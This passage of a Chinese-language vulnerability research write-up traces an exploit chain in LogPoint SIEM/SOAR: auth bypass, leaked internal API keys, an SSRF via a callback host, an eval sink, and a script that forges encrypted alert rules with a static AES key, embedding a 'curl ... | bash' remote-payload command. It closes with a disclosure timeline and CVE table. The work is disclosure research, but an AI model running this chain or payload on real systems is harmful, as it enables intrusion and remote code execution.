secbi_auth_token:eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhb2hlbmlsInVzZXJuYW1lIjoidWRtaW4iLCJyb2xlIjoiQVRNIiwiZXhwIjoxNzAxMTM2MDcsImlhdCI6MTcwMTEzMjA3fQ.1COlbZflJq0eXBlHj01QWVSClmhDCN6tXODcwNVt40HO.E8bc_BGubwbLH-S1M4rFndObqvVTAJHodIYOb5GJqCSec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"Accept: application/jsonSec-Ch-Ua-Mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36Sec-Ch-Ua-Platform: "Windows"Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://192.168.179.136/soar/automation/playbooksAccept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9Priority: u=1, i// 响应HTTP/2 200 OKServer: nginxDate: Tue, 18 Jun 2024 10:44:11 GMTContent-Type: application/jsonVary: Accept-EncodingAccess-Control-Allow-Origin: *Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETEAccess-Control-Allow-Headers: DNT, User-Agent, X-Requested-With, If-Modified-Since, Cache-Control, Content-Type, RangeAccess-Control-Expose-Headers: Content-Length, Content-RangeX-Frame-Options: SAMEORIGINX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffContent-Security-Policy: default-src 'self'; child-src 'self' blob:;    script-src 'self' 'unsafe-inline' 'unsafe-eval';    style-src 'self' 'unsafe-inline';    img-src 'self' data: blob:;    report-uri /content_policy_violation;    font-src 'self' data:;    worker-src blob:;Cache-Control: max-age=0, no-cache, no-store, must-revalidatePragma: no-cacheStrict-Transport-Security: max-age=15768000[  {    "apiKey": "2LRnxYx1BwZrJ5FJRpMrMdEaTwbqaLar8RpnAGi2jxwM1g_nGq-gNTxPCdUNL-t4eCMjqPSwPvNOFQElgAz3nhbUzcHOPC-mwEUHpcj-PRKRFNTLDIC16Ty7EJg",    "apiSecret": "XzRvV2V0gSBltEjdvwrGSQ=="  }]
```  
  
这很令人兴奋,但它立即引发了另一个问题。响应中的 apiKey  
 到底是什么,为什么它看起来与我已经使用的 JWT 令牌完全不同?再一次,答案显然隐藏在代码中。  
### 漏洞 3:将权限提升到隐藏的内部 SOAR 用户  
  
正如方法名所示,/v1/user/auth/apikey  
 映射到 getAllApiCredentials()  
,它返回存储在 Java 端的 API 凭据。响应是一个数组,但它只包含一个 apiKey  
 和 apiSecret  
。  
  
看起来这些凭据属于我的 admin  
 账户,并在 SOAR 服务之间内部使用。JWT 让我进入,但在系统内部,认证转移到这个 API 密钥模型。  
  
这引出了显而易见的下一个问题。如果我现在有一个 API 密钥,是否有一个接受它并告诉我我是谁的端点?我复制了新泄露的 apiKey  
 并发送以下请求。  
```
GET /soar/sso/v1/user/apikey HTTP/2Host: 192.168.179.136
Secbi_api_key: 2IBwnxkulBv7I5EJpnMvKdEaIwbqaLsAr8BpAGij2jXmWsD_vv6q-gWTXpCdUNl-t4eCMjqPSwPvNOFqElgAz3nhbUzcHOPC-mwEUHpcj-PRKRFNTLDIC16Ty7EJgSec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"Accept: application/json
```  
  
我们实际上告诉我我是谁的新端点?与我刚刚使用的端点非常相似。  
- • 我们接受 Secbi_api_key  
 头的新 API 是 sso/v1/user/apikey  
。  
  
- • 我们之前使用的接受 secbi_auth_token  
 头并返回所有 API 令牌的是 sso/v1/user/auth/apikey  
  
是的,我也很困惑。通过混淆实现安全几乎奏效了。几乎。  
但真正的惊喜在响应本身。返回的 JSON 非常清楚地回答了这个问题。  
  
用户名是 secbi  
。  
```
HTTP/2 200 OKServer: nginxDate: Tue, 18 Jun 2024 11:24:34 GMT
... 省略头部 ...Strict-Transport-Security: max-age=15768000{  "username": "secbi",  "password": null,  "role": 0,  "tokenStrategy": null}
```  
  
事实证明,这根本不是普通用户。secbi  
 是一个内部的、最高权限的 SOAR 账户,随安装一起提供,专门用于微服务之间的通信。  
> 通过链接这 3 个漏洞,我们可以访问 Logpoint 的 Java 微服务组件中的每一个端点!  
  
## 批判性思考:从现在开始该何去何从?  
  
在 Java 微服务中链接问题显然扩大了攻击面,但它也有上限。即使在那里完全妥协,也会让我留在容器内。这不是终局。  
  
所以我转移了焦点。这些令牌或 API 密钥都不适用于运行在操作系统本身上的 Python 后端,但这引发了一个更有趣的问题。如果我可以在链中添加更多漏洞,让我直接在 Python 端启动管理员会话呢?  
  
这就是真正乐趣的开始。  
## 漏洞 4:服务器端请求伪造导致 LogPoint Python 后端的认证绕过  
  
我在浏览笔记时思考需要在链中添加什么类型的"漏洞",然后我看到了以下日志!  
```
LOGPOINT API call:
Method: GET
URL: http://127.0.0.1:18000/User/preference
cookie: class Cookie {
  key: session
  value: INVALIDCOOKIE
}
```  
  
这立即让我回到监听 localhost:18000  
 的服务,只能从设备内部访问。到目前为止,我从未费心阅读那部分代码。根本没有理由。  
  
但现在有了。如果那里存在可利用的东西,我不需要直接访问。我可以转向 Java 端并寻找 SSRF 来访问它。由于请求源自 localhost  
,访问控制根本不会成为障碍。  
  
在那时,前进的道路变得非常清晰。我找到了一些我实际上可以使用的东西!  
```
@app.route("/private/user_access_key", methods=["GET"])def secret_fetch():    """    为应用程序间数据传输而暴露的内部 API。    从数据库读取管理员用户的访问密钥 (secret_key) 并将其发送给请求者。    """
    secret_key = None
    admin_user = dict()
    pipelines = [
        {            "$match": {"active": True},
        },
        {            "$project": {                "username": 1,                "secret_key": 1,                "usergroup_fk": {                    "$map": {                        "input": {                            "$map": {                                "input": "$usergroup",                                "in": {                                    "$arrayElemAt": [{"$objectToArray": "$$this"}, 1]
                                },
                            }
                        },                        "in": "$$this.v"}},
            }
        },
        {            "$lookup": {                "from": "usergroup",                "localField": "usergroup_fk",                "foreignField": "_id",                "as": "usergrps"
            }
        },
        {"$unwind": '$usergrps'},
        {'$match':
         {'usergrps.lpadmin': True}},

    ]

    admin_user = dboperation.aggregation_pipe('user', pipelines)    if admin_user:
        admin_user = admin_user[0]
        secret_key = admin_user.get("secret_key")    else:
        logging.critical(            "search api; requested; type=audit_log; msg=active admin user not found; source_address=%s"
            % request.remote_addr
        )        return jsonify({"success": False, "message": "Active admin user not found."})    return jsonify({"success": bool(secret_key),                       "username": admin_user.get('username', None), "secret_key": secret_key})
```  
  
上述端点只是返回管理员用户的 secret_key  
!但请稍等,我现在有更多问题了。  
```
root@logpoint:~ curl http://127.0.0.1:18000/private/user_access_key
{  "secret_key": "9930cb348f02c7114f7f1206fa964595",  "success": true,  "username": "admin"
}
```  
  
这个内部 API 作为 Java SOAR 服务和旧版 Python 后端之间的桥梁存在,允许它们在向旧核心平台添加新的基于 Docker 的功能时进行通信。从攻击者的角度来看,这是一个完美的 SSRF 目标。但它不是普通的公共端点。只有一小部分内部 API 接受 secrets  
 并返回数据,所有这些都严格设计用于微服务使用。  
> **我如何利用这个密钥在 Python 端启动新的会话 cookie?**  
  
  
进一步阅读 Python 代码库向我展示了 /initapp  
 端点上一个有趣的 if-else 语句。发送一个带有有效用户名和 secret_key  
 的简单 HTTP POST 请求就足以启动有效会话并检索 COOKIE。  
```
def initiate_admin_session(lp_user_dict):    global TARGET, cookies    print("[+] Going to abuse /initapp on LogPoint-SIEM Backend to assign our user to the session..!")

    payload = {        'user': 'admin',        'secret': "9930cb348f02c7114f7f1206fa964595',        'CSRFToken': 'undefined'    }    r = requests.post(TARGET + '/initapp',data=payload, verify=False)    if r.cookies:        print("[+] Successfully initiated the admin session ournew cookie : " + str(r.cookies))        cookies = r.cookies    else:        print("[-] Awkward..! Could not initiate the admin session")        print(r.text)        exit(1)
```  
  
我准备在 Java 层寻找 SSRF!这是我对这个容器化的 LogPoint 微服务的最后一次检查。  
  
到目前为止,我仍然在容器内。这个边界即将消失。  
### ConfigTest SSRF 的根本原因分析  
  
通过简单的 IDE 搜索,找到合适的候选者并知道在代码库中查找位置非常容易。我还使用 Semgrep 来加快速度,但该过程的细节在这里并不重要。  
  
当请求发送到 /soar/api/v1/soar-sources/config/test/run  
 时,它被路由到名为 **api-service**  
 的内部 docker 容器。控制器方法在 api/soar/sources/SoarSourcesApi.java  
 中实现。  
```
@Overridepublic ResponseEntity<ActionResult> testSourceConfig(    @ApiParam(value = "a full source with additional params", required = true)    @Valid @RequestBody final SourceConfigTestContext sourceConfigTestContext) {    final SourceConfig sourceConfig = sourceConfigTestContext.getSourceConfig();    final long timeIntervalMinutes = sourceConfigTestContext.getTimeIntervalMinutes();    final PullResultContext result = this.pullerTestExecutor.pullTest(
            sourceConfig,
            timeIntervalMinutes
        );    final ActionResult actionResult = new ActionResult();
    actionResult.setId(sourceConfig.getUuid());
    actionResult.setName(sourceConfig.getSourceName());
    actionResult.setStatusCode(
        String.valueOf(result.getStatusCode())
    );

    ActionUtils.populateActionResultHttpRequestResponseStr(
        actionResult,
        result.getHttpRequest(),
        result.getResponse(),
        result.getRawResponseBody()
    );

    actionResult.setRawResponse(result.getRawErrorResponse());    return (ResponseEntity<ActionResult>)        new ResponseEntity(
            (Object) actionResult,
            HttpStatus.OK
        );
}
```  
  
上述代码非常简单。请求的 JSON 主体被发送到 pullTest()  
```
public PullResultContext pullTest(SourceConfig sourceConfig, Long timeIntervalMinutes) {
    PullResultContext pullResultContext;    try {        SourceConfig encryptSourceConfig =
            DispatcherCommonUtils.encryptExecutionParameters(this.incidentsSourceDao, sourceConfig);        Puller puller = PullerFactory.get(this.configuration, encryptSourceConfig);
        puller.init();        long nowSeconds = Instant.now().getEpochSecond();        long slidingWindowSeconds = TimeUnit.MINUTES.toSeconds(timeIntervalMinutes);        long startNewLogPullTimeSeconds = nowSeconds - slidingWindowSeconds;

        pullResultContext = puller.execute(
            encryptSourceConfig,
            startNewLogPullTimeSeconds,
            nowSeconds,
            encryptSourceConfig.getTzCode()
        );
    } catch (Exception e) {
        pullResultContext = new PullResultContext();
        pullResultContext.setStatusCode(500);        Throwable cause = e.getCause();
        pullResultContext.setRawErrorResponse(
            cause != null ? cause.toString() : e.getMessage()
        );
    }    return pullResultContext;
}
```  
  
当我查看 sourceConfig  
 类以了解 JSON 数据结构时,因为它是从控制器方法的 HTTP 主体填充的,我甚至根本不需要阅读 puller.execute()  
。  
```
{  "sourceConfig": {    "uuid": "a22aa4d1-2df2-4b8a-9aba-cf5087bc01d9",    "description": "Local Logpoint-SIEM instance",    "enabled": true,    "executionParams": {      "logpointSiemMachineIp": "xrsbfpeerdfulurvi24lssvvm2dq4nsc.oastify.com:80/?asd=",      "logpointPrivateApiSchema": "http",      "logpointPrivateApiPort": "80",      "logpointIncidentsApiPath": "/incidents",      "enforceCredentialsFromFile": false,      "logpointPullIncidentsUserName": "",      "logpointPullIncidentsAccessKey": ""    },    "filters": null,    "idFieldName": "incident_id",    "sourceType": "LOGPOINT",    "tzCode": "UTC",    "sourceName": "Logpoint-SIEM"  },  "timeIntervalMinutes": 1}
```  
  
实现只是简单地连接协议、机器 IP、端口和路径。这些字段都没有验证。通过在 logpointSiemMachineIp  
 后附加查询字符串,后面的所有内容(包括路径和端口)都被视为查询的一部分。  
  
这改变了一切。有了这个,我可以强制应用程序向我选择的任何 URL 发出 GET 请求。  
> 额外提示:我在末尾附加 ?asd=  
,因为运行器倾向于将额外的路径/端口片段连接到我们的输入/主机上。通过提前开始查询字符串,它稍后附加的任何内容都被视为**查询参数**  
的一部分,而不是实际的主机/路径  
  
  
唯一缺少的部分是第一个参数的有效 uuid  
,事实证明很容易从 /soar/api/v1/soar-sources/config  
 端点本身获得!  
## 4 个漏洞链接的回顾  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tP4PqMKklpVWyxEevqmo4JdicGdicQDuYIeHnDGqBmGwh5WAV3W9FvKyPw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
现在只剩下一件事要做。在 Python 后端找到代码执行漏洞。事实证明,这打开了另一个等待探索的兔子洞。  
## 漏洞 5 – Python 后端经过身份验证的代码评估漏洞  
  
此时,任务变得出奇地简单。我不再需要阅读整个代码库。相反,我缩小了焦点,开始寻找接收点,即使用潜在危险函数的地方,以及一个小错误可能变成更大问题的地方。  
  
我找到了以下代码段,它已经表明这与规则引擎有关。但由于运算符都是比较运算符,因此在到达这里之前不可能验证这些 left  
 和 right  
 参数,对吧?  
```
class _Condition:    @classmethod    def evaluate(cls, left, right, operator):        if operator in ('<', '>', '<=', '>=', '==', '!='):            return eval(str(left) + str(operator) + str(right))
```  
  
现在我所要做的就是查找这个 _Condition  
 类的所有引用,看看这些 left  
 或 right  
 是否可以是整数以外的任何内容。从我们的接收点向后遍历到源头。  
  
这个函数只在一个地方被调用,即 _Alert.is_triggered()  
。这就是那个相当小的错误让我开心的地方!  
```
def is_triggered(self, rows_count, alert_id, field, field_values, time_range, throttling_enabled):    """    评估是否已达到警报的触发条件。    如果满足条件则返回 True。    """
    alert_triggered = _Condition.evaluate(rows_count, self.get("trigger_value"), self.get("condition"))    if alert_triggered is None:
        logging.warning("alerting; condition unknown; alert_name=%s; condition=%s;", self.get("alert_name"), self.get("condition"))    if alert_triggered is True:        if throttling_enabled is True:
            should_throttle = self.should_throttle_alert(alert_id, field, field_values, time_range)
            alert_triggered = False if should_throttle else True    return alert_triggered
```  
  
你可能还记得,我只能将有效载荷放入 evaluate()  
 的第一个或第二个参数中。第二个参数是发生小但关键错误的地方。self.get("trigger_value")  
 不是被验证,而是简单地直接从对象的属性中提取值。  
  
有趣的是,_Alert  
 已经有一个专门为此目的设计的方法。它正确地将值转换为整数。但该方法从未在这里使用!该值直接从 getter  
 中获取并按原样传递。  
```
def get_trigger_value(self): # 注意:此函数从未使用 mdisec    """    返回警报触发值    """    try:
        trigger_value = int(self.get("trigger_value"))    except ValueError:
        trigger_value = None
        logging.info("alerting; invalid trigger value; integer expected; got trigger_value=%s", self.get("trigger_value"))
```  
  
让我们继续追踪调用者链。is_triggered  
 函数只从一个地方调用。它位于 AlertAnalyzer  
 类内部,该类跨越 300 多行代码。为了保持对重要内容的关注,我省略了其他所有内容,只显示与相关行为相关的行。  
```
class AlertAnalyzer:    # ... 省略代码 ...    def analyze(self, answer):
        search_id = answer.get("orig_search_id")
        alerts_list = self.search_alert_map.get_alert_list(search_id)               # ... 省略代码 ...
        rows_count = len(answer.get("rows"))                for alert_id in alerts_list:
            alert = self.alerts.get(alert_id)            # ... 省略代码 ...            if alert.is_triggered(rows_count, alert_id, field, field_values, time_range,throttling_enabled):                                # ... 省略代码 ...
```  
  
胜利条件终于清楚了。如果我可以在数据库中保存自己的警报,并在 trigger_value  
 字段中嵌入有效载荷,我可以使用故意通用的查询启用规则,因此它始终匹配。引擎评估该条件的那一刻,它也会评估我的有效载荷。这就是它停止成为理论并成为远程代码执行的点。  
> 问题不在于是否可以创建规则。  
> 真正的问题是验证这次是否捕获它,还是我是否再次幸运?  
  
## 漏洞 6 – 利用 AES 静态密钥导入加密的 PAK 文件以绕过整数验证  
  
以下 UI 截图显示了如何创建警报规则,不幸的是,我们没有连续两次幸运。条件值已验证,它期望我发送一个整数。因此,我无法将有效载荷实际植入规则中!  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tP4kHQMpeOvKNQ5TYmSpWQLxvnmr6KjibKRphD8K3stPc0IDwAbfLca4Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
那是我意识到我有隧道视野的时刻。我已经深入兔子洞,在一个方向上推得太久了。感觉是时候退后一步,停止强迫它,并在其他地方寻找危险了。  
  
我开始关闭浏览器标签。就在我快完成之前,我注意到了它。  
  
我差点错过它。  
  
一个按钮静静地坐在那里。**导出规则**  
 按钮。  
  
我导出规则并立即注意到一些有趣的东西。其内容已加密。当我将其导入回 LogPoint 时,它会被解密并按预期写入数据库。  
  
这时一个熟悉的模式出现了。加密通常会产生信任的错觉。一旦数据被加密,工程师通常会假设它是安全且未更改的,因此会跳过他们之前会应用的验证步骤。如果系统信任解密后出来的任何东西,那么真正的挑战不再是验证。  
  
我所需要做的就是了解这种加密是如何工作的并修改规则。仔细查看实现揭示了关键细节。警报导出过程中使用的 AES 密钥是静态的。  
### 警报规则解密器  
  
以下脚本的大部分加密相关代码直接取自原始代码库。  
```
FORMAT_PREFIX = b'v2:'
WEB_DELIVERY_IP = "172.28.150.242"  # TODO: 将此更改为你监听反向 shell 的 IP
FLASK_APP_ENCRYPTION_KEY = 'ImmUnEsEcUrIty'
ENC_KEY = hashlib.md5(FLASK_APP_ENCRYPTION_KEY.encode("utf-8")).hexdigest()
CHECKSUM_LEN = 16

CHECKSUM_LEN = 16
FORMAT_PREFIX = b'v2:'def decrypt_data(enc_data):    """    解密由 AES 加密的数据    """
    IV = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'    try:        if not enc_data.startswith(FORMAT_PREFIX):
            old_decoder = AES.new(tobytes(ENC_KEY), AES.MODE_ECB, IV)            return old_decoder.decrypt(enc_data).rstrip(b' ')
        obj = AES.new(tobytes(ENC_KEY), AES.MODE_CFB, IV)
        decrypted = obj.decrypt(enc_data[len(FORMAT_PREFIX):])
        checksum = decrypted[:CHECKSUM_LEN]
        raw_data = decrypted[CHECKSUM_LEN:]
        expected_checksum = hmac.new(tobytes(ENC_KEY), raw_data).digest()        if checksum != expected_checksum:            raise ValueError("invalid checksum")        return tostring(raw_data)    except ValueError as e:        try:            print("webserver import data; error=%s" % e)            return        finally:
            e = None            del edef encrypt_data(raw_data):    """加密长数据    """
    IV = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    raw_data = tobytes(raw_data)
    checksum = hmac.new(tobytes(ENC_KEY), raw_data).digest()    assert len(checksum) == CHECKSUM_LEN
    obj = AES.new(tobytes(ENC_KEY), AES.MODE_CFB, IV)    return FORMAT_PREFIX + obj.encrypt(checksum + raw_data)def decrypt_pak_alertrule():    with open('mdisec-generated-backdoored-implanted-rule.pak', 'rb') as f:
        data = f.read()        # 保存为 alert.json        with open('alert.json', 'w') as f:
            f.write(decrypt_data(data))def generate_backdoored_pak_file():    with open('alert.json', 'r') as f:
        data = f.read()        # 加载 json 并修改警报规则
        data = json.loads(data)
        data['Alert'][0]['name'] = generate_random_string()
        data['Alert'][0]['settings']['alertrule_id'] = hashlib.md5(generate_random_string().encode()).hexdigest()
        data['Alert'][0]['settings']['condition']['condition_value'] = "eval(\"__import__('os').system('curl {WEB_DELIVERY_IP}:8000 | bash')\")"        with open('backdoored-implanted-rule.pak', 'wb') as f:
            f.write(encrypt_data(json.dumps(data)))            # 将 json 保存为纯文本            with open('backdoored-implanted-rule.json', 'w') as f:
                f.write(json.dumps(data, indent=4))"""# pip3 install pycryptodome"""
decrypt_pak_alertrule()
generate_backdoored_pak_file()
```  
  
获取 shell 的最短路径之一是简单的 Web 交付有效载荷。一旦我们的有效载荷运行,LogPoint 设备将运行 curl  
 命令从我们的服务器获取第二阶段的有效载荷并将其传输到 bash  
!有点吵,是的,但这也不是红队演习。  
  
我将有效载荷包装在 eval()  
 调用中,因为 _Condition.evaluate()  
 中的接收点会在变量周围连接额外的字符串。该行为使其很容易遇到 Python 语法错误,这是我想完全避免的。目标很简单:干净地执行我的代码。我自己的 eval()  
 运行后发生的任何事情都无关紧要。  
  
一旦我导入了我生成的 backdoored-implanted-rule.pak  
 文件,规则就成功导入了!现在我需要找到一种方法来触发规则。  
## 最后一步:如何触发警报  
  
导入修改后的警报还不够。我仍然需要一种方法来触发它并到达易受攻击的代码路径。  
  
最简单的方法是创建一个规则并将其附加到警报。方便的是,这可以在同一个 PAK 文件中完成。我打开在 alert-pak-file-decrypt.run  
 步骤中生成的 alert.json  
 文件,并开始连接各个部分。  
```
"livesearch_data": {  "generated_by": "alert",  "searchname": "mdi",  "description": "",  "flush_on_trigger": false,  "query": "\"user_agent\"=\"*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)*\" \"GET\" robots.txt",  "repos": [    "127.0.0.1:5504"  ],  "extra_query_filter": "",  "query_info": {    "aliases": [],    "columns": [],    "fieldsToExtract": [      "user_agent",      "msg"    ],    "grouping": [],    "lucene_query": "((user_agent:*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)* AND GET) AND robots.txt)",    "query_filter": "\"user_agent\"=\"*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)*\" \"GET\" robots.txt",    "query_type": "simple",    "success": true  }}
```  
  
规则本身故意简单。如果有一个带有 Google 爬虫用户代理的对 robots.txt  
 的 GET 请求,规则就会触发。  
  
我发送了大约一百个请求以达到阈值。由于规则扫描过去 30 天的日志并每分钟运行一次,我只需要稍等片刻,引擎就会将其捕获并执行。  
  
(默认情况下,Logpoint 将自己的日志填充到索引中。这意味着我们可以使用 LogPoint HTTP 端口发送这些 robots.txt  
 请求)  
## 实际利用:将 6 个漏洞 + 1 个功能链接在一起!无需登录的远程代码执行  
  
我记录了我的漏洞利用行动  
## 攻击链回顾  
  
从边缘的路由问题开始,通过内部服务、身份验证逻辑传播,最终到达 Python 后端、静态 AES 密钥和代码评估漏洞,导致远程代码执行。下图显示了完整的流程。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tPDAIhIKgFa39BpcScN988Z6oklxU2jCBP9TCAyPUjf298j2piau0vOpQ/640?wx_fmt=png&from=appmsg "null")  
  
## 公开披露时间线  
- • 30/05/2024 11:00 BST – LogPoint 产品安全网站指示用户"创建支持工单",但它不允许我创建支持账户。我找不到任何电子邮件地址或其他渠道来报告协调漏洞披露的问题。  
  
- • 30/05/2024 15:01 BST – 我向 LogPoint 员工发送了 LinkedIn InMail 消息以确定联系人。(这实际上是我每年继续为 LinkedIn Premium 付费的唯一原因。)  
  
- • 30/05/2024 17:28 BST – 一位 LogPoint 高管迅速回复,我们开始通过电子邮件通信。  
  
- • 30/05/2024 22:18 BST – 同一位高管确认披露已在处理中。  
  
- • 10/06/2024 10:04 BST – 我请求状态更新。  
  
- • 10/06/2024 12:03 BST – 供应商确认他们正在积极修复。  
  
- • 20/06/2024 05:20 BST – 供应商提供更新,表明正在对三个报告的漏洞进行修复。  
  
- • 20/06/2024 09:28 BST – 发送了一封详细的电子邮件,提供发布前补丁分析支持,并提供威胁情报和 0-day 研究活动的背景。明确说明通信与销售无关,是在协调漏洞披露的背景下进行的。  
  
- • 16/07/2024 08:38 BST – 供应商承认并感谢补丁分析的提议,确认修复正在进行中。  
  
- • 22/07/2024 13:03 BST – 我报告了 8 个额外的严重漏洞。  
  
- • 24/07/2024 06:45 BST – 供应商确认收到额外的漏洞报告。  
  
- • 19/08/2024 09:10 BST – 自初始披露以来已过去 80 天。我请求更新。  
  
- • 21/08/2024 09:53 BST – 供应商确认最初报告的漏洞已修复并即将发布,公开披露仅在正式发布后进行。  
  
- • 19/09/2024 13:00 BST – 自 3 个漏洞的初始披露以来已过去 112 天,自额外 8 个漏洞(其中一些包括无需登录的 RCE 向量)以来已过去 60 天,没有热修复或有意义的更新。因此,我们采取主动措施通知受影响的组织。  
  
- • 3/10/2024 00:00 CET – LogPoint 在 7.5.0 版本的优先访问版本中发布了补丁。  
  
- • 31/10/2024 11:03 CET – 我意识到 LogPoint 宣布发布的公开博客文章。  
  
- • 14/01/2025 16:24 BST – 229 天后,我们发布了第一次公开披露,但没有发布完整的技术细节。  
  
- • 02/01/2026 – 由于供应商持续缺乏沟通,我得出结论,重大架构更改仍在进行中。鉴于 SIEM/SOAR 安全产品中漏洞的严重性,我决定将完整技术文章的发布推迟 365 天。  
  
## 供应商的官方公告  
  
下表显示了供应商发布的 CVE 编号和严重性。  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">标题</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">CVSS 严重性</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">描述</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-56086</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">7.1 高</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">报告模板 RCE</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-56085</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">5.9 中</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">服务器端模板注入 RCE</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-48954</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">6.4 中</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">EventHub 收集器操作系统命令注入</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-48953</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">7.5 高</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">无需登录的插件注册</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft 